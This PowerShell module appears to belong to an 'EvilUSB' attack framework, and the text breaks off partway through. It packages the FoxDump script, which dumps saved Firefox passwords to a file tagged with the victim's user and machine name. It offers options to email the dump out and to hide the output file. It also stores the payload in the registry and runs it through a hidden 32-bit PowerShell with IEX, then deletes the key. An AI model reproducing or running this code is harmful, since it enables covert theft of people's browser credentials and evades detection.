Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'FoxDump'
		Author = '@xorrior'
		Description = "This module will dump any saved passwords from Firefox to the console. This should work for any version of Firefox above version 32. This will only be successful if the master password is blank or has not been set."
		Link = "https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-FoxDump.ps1`nhttp://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/"
	...
	$Options = @{
		'OutputFile' = New-Object PSObject -Property @{
			...
			'Required' = "True"
			'Value' = '$PWD\FoxDump-$([Environment]::UserName)@$([Environment]::MachineName).txt'
		}
		...
		'EmailSubject' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = 'FoxDump-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
	}
...
Function Add-Payload {
	...
	# e.g:
	$ModuleSource = Get-Content "$PWD\data\payload_source\Exfiltration\Get-FoxDump.ps1" | Out-String
	
	$Command = 'Get-FoxDump -OutFile "' + $Options.OutputFile.Value + '";'
	...
	if ($Options.EmailReport.Value -or $Options.EmailReport.Value -eq "true")
	{
		if ($Global:Settings.Email.User -ne "" -and $Global:Settings.Email.Password -ne "")
		{
			...
			#$Command += [String]::Format('Send-Mail -From ''{0}'' -Password ''{1}'' -Key {2} -To ''{3}'' -Subject "{4}" -Body ([IO.File]::ReadAllText("{5}"));', $From, $Password, $Key, $To, $Subject,$Options.OutputFile.Value)
	...
	if ($Options.Hide.Value -or $Options.Hide.Value -eq "true")
	{
		...
		EvilUSB:Print 0 "Use 'attrib /s /d -s -r -h <file_path>' to unhide the output file."
	}
	
	#$PayloadCode = $32BytesCheck + $ModuleSource + $Command
	$PayloadCode = '$FirefoxDump = {' + $ModuleSource + $Command + "}`n"
	$PayloadCode += @'
if ([Environment]::Is64BitProcess)
{
	New-ItemProperty -Path HKCU: -Name ffDump -PropertyType String -Value $FirefoxDump.ToString() -Force | Out-Null
	Start-Process -FilePath $env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ArgumentList 'IEX (Get-ItemProperty -Path HKCU: -Name ffDump).ffDump; Remove-ItemProperty -Path HKCU: -Name ffDump -Force' -WindowStyle Hidden
}
else
{
	$FirefoxDump.Invoke()
